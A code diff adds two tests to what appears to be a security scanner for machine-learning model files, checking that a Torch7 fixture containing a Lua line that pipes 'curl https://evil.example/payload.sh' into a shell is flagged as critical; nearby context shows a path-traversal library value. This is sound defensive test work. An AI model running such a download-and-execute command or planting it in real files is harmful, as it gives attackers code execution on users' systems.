@@ -928,6 +928,42 @@ def test_scan_nested_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp
     assert "bounded probe ended before the first structural root element" in check.message
 
 
+def test_scan_nested_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["torch7"]
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_routes_torch7_bin_when_raw_scanner_is_suppressed(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload.bin"
+    extracted_member.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["torch7"], "cache_enabled": False})
+
+    assert result.scanner_name == "torch7"
+    assert "pytorch_binary" in result.metadata["skipped_scanner_ids"]
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 def test_scan_nested_file_routes_renamed_mxnet_symbol_by_structure(tmp_path: Path) -> None:
     extracted_member = create_mock_mxnet_symbol(tmp_path / "payload.dat", custom_library="../../tmp/libevil.so")
 
